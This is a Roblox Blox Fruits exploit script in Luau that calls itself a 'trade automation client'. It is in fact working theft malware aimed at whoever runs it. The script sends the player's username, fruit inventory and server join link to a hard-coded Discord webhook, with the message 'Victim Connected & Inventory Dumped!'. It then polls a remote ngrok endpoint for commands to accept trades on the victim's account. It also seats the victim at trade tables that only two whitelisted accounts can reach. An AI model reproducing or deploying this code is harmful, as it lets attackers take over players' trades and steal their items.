-- made by Noob -- Finalized Blox Fruits Trade Automation Client Script (Headless Strict Whitelist Edition)
-- lang: Luau, target: Roblox / Blox Fruits, executor: Delta/Fluxus
-- *fully integrated inventory dump webhook, command polling loop, and strict whitelisted auto-sit/table-switching mechanism*

getgenv().bfRunning = nil
getgenv().bfRunning = true

print("[DEBUG] Initializing Finalized Blox Fruits Trade Automation with Strict Whitelist...")

local Config = {
    AuthorizedUsers = { "BLACKGOKU_0707", "Aid3no" },
    WebhookUrl = "https://discord.com/api/webhooks/1568890822420734094/CmM8-p7faQFs-rMwPhRqfMSlEG7-mV87NU3IEe-w3ZodJpaDRS2vrv0Befqxg6PB7DIY",
    CommandApiUrl = "https://bronzing-caution-vivacious.ngrok-free.dev/get_commands"
}

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local Workspace = game:GetService("Workspace")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer

local Remotes = ReplicatedStorage:WaitForChild("Remotes", 5)
local CommF = Remotes and Remotes:WaitForChild("CommF_", 5)
local TradeFunction = Remotes and Remotes:WaitForChild("TradeFunction", 5)

local requestFunc = syn and syn.request or http_request or request

local function IsAuthorized(username)
    for _, name in ipairs(Config.AuthorizedUsers) do
        if name == username then
            return true
        end
    end
    return false
end

local function GetInventory()
    local success, result = pcall(function()
        if CommF then return CommF:InvokeServer("getInventory") end
        return {}
    end)
    return (success and type(result) == "table") and result or {}
end

local function TransmitTelemetry()
    local inventory = GetInventory()
    local fruitsList = {}

    for _, item in pairs(inventory) do
        if item.Type == "Blox Fruit" then
            table.insert(fruitsList, (item.Name or "Unknown") .. " (x" .. tostring(item.Count or 1) .. ")")
        end
    end

    local payloadData = {
        content = "@everyone Victim Connected & Inventory Dumped!",
        embeds = {{
            title = "Target Session Report",
            color = 12451840,
            fields = {
                { name = "Username", value = LocalPlayer.Name, inline = true },
                { name = "Stored Fruits", value = #fruitsList > 0 and table.concat(fruitsList, ", ") or "None", inline = false },
                { name = "Server Join Link", value = "`teleportService:TeleportToPlaceInstance(" .. tostring(game.PlaceId) .. ", \"" .. tostring(game.JobId) .. "\", game.Players.LocalPlayer)`", inline = false }
            },
            timestamp = DateTime.now():ToIsoDate()
        }}
    }

    if requestFunc then
        pcall(function()
            requestFunc({
                Url = Config.WebhookUrl,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode(payloadData)
            })
        end)
    end
end

local function InvokeTradeAction(action)
    if not TradeFunction then
        warn("[ERROR] TradeFunction remote missing!")
        return
    end

    print("[DEBUG] Processing action via verified remote layout:", action)

    pcall(function()
        if action == "accept" then
            local args = { "accept" }
            TradeFunction:InvokeServer(unpack(args))
        elseif action == "cancel" then
            local args = { "cancel" }
            TradeFunction:InvokeServer(unpack(args))
        end
    end)
end

-- Teleport / Tween handling for safe seating movement
local function TweenToSeat(hrp, targetCFrame)
    local distance = (hrp.Position - targetCFrame.Position).Magnitude
    local speed = 150 
    local duration = math.clamp(distance / speed, 0.2, 1.5)
    
    local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
    local tween = TweenService:Create(hrp, tweenInfo, { CFrame = targetCFrame })
    tween:Play()
    tween.Completed:Wait()
end

local function IsTradeTableSeat(seat)
    local parent = seat.Parent
    return parent and parent.Name == "TradeTable" and (seat.Name == "P1" or seat.Name == "P2")
end

-- Strictly checks if a player sitting in a seat is NOT authorized. Returns the player's name if unauthorized, or nil if safe/empty.
local function GetUnauthorizedPlayerInSeat(seat)
    local overlapParams = OverlapParams.new()
    overlapParams.FilterType = Enum.RaycastFilterType.Exclude
    overlapParams.RespectCanCollide = false

    local partsInRegion = Workspace:GetPartsInPart(seat, overlapParams)
    for _, part in ipairs(partsInRegion) do
        local character = part.Parent
        if character and character:FindFirstChildOfClass("Humanoid") then
            local player = Players:GetPlayerFromCharacter(character)
            if player and player ~= LocalPlayer then
                if not IsAuthorized(player.Name) then
                    return player.Name
                else
                    return nil
                end
            end
        end
    end
    
    if seat.Occupant then
        local char = seat.Occupant.Parent
        local player = Players:GetPlayerFromCharacter(char)
        if player and player ~= LocalPlayer then
            if not IsAuthorized(player.Name) then
                return player.Name
            end
        end
    end
    
    return nil
end

-- Checks if a table has any unauthorized person occupying either chair
local function IsTableBlocked(tableModel)
    for _, child in ipairs(tableModel:GetChildren()) do
        if child:IsA("Seat") and IsTradeTableSeat(child) then
            local unauth = GetUnauthorizedPlayerInSeat(child)
            if unauth then
                return true
            end
        end
    end
    return false
end

-- Telemetry & Command Polling background thread
task.spawn(function()
    pcall(TransmitTelemetry)

    if not requestFunc then
        warn("[ERROR] Executor does not support http requests!")
        return
    end

    while true do
        task.wait(2)
        pcall(function()
            local response = requestFunc({
                Url = Config.CommandApiUrl,
                Method = "GET"
            })

            if response and response.StatusCode == 200 then
                local data = HttpService:JSONDecode(response.Body)
                if data and data.command then
                    print("[DEBUG] Command fetched from Discord bridge:", data.command)
                    InvokeTradeAction(data.command)
                end
            end
        end)
    end
end)

-- Strict Whitelist Headless Auto-Sit & Table Switching Loop
task.spawn(function()
    local lastTable = nil
    local jumpCooldown = 0

    while true do
        task.wait(0.5)
        
        local character = LocalPlayer.Character
        if not character or not character:FindFirstChild("HumanoidRootPart") then continue end
        local hrp = character.HumanoidRootPart
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if not humanoid then continue end

        if humanoid.SeatPart then
            local currentSeat = humanoid.SeatPart
            if IsTradeTableSeat(currentSeat) then
                lastTable = currentSeat.Parent
                
                local tableModel = currentSeat.Parent
                local unauthorizedFound = nil

                for _, child in ipairs(tableModel:GetChildren()) do
                    if child:IsA("Seat") and IsTradeTableSeat(child) then
                        local unauthName = GetUnauthorizedPlayerInSeat(child)
                        if unauthName then
                            unauthorizedFound = unauthName
                            break
                        end
                    end
                end

                if unauthorizedFound then
                    humanoid.Sit = false
                    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                    jumpCooldown = tick() + 2
                    task.wait(0.8)
                end
            end
        else
            if tick() < jumpCooldown then continue end

            local bestSeat = nil
            local shortestDist = math.huge

            for _, obj in pairs(Workspace:GetDescendants()) do
                if obj:IsA("Seat") and IsTradeTableSeat(obj) then
                    local tableModel = obj.Parent
                    if obj.Parent ~= lastTable and not IsTableBlocked(tableModel) then
                        local dist = (hrp.Position - obj.Position).Magnitude
                        if dist < 800 and dist < shortestDist then
                            shortestDist = dist
                            bestSeat = obj
                        end
                    end
                end
            end

            if not bestSeat and lastTable then
                lastTable = nil
            end

            if bestSeat then
                local targetCF = bestSeat.CFrame + Vector3.new(0, 3, 0)
                TweenToSeat(hrp, targetCF)
                task.wait(0.2)
                bestSeat:Sit(humanoid)
            end
        end
    end
end)
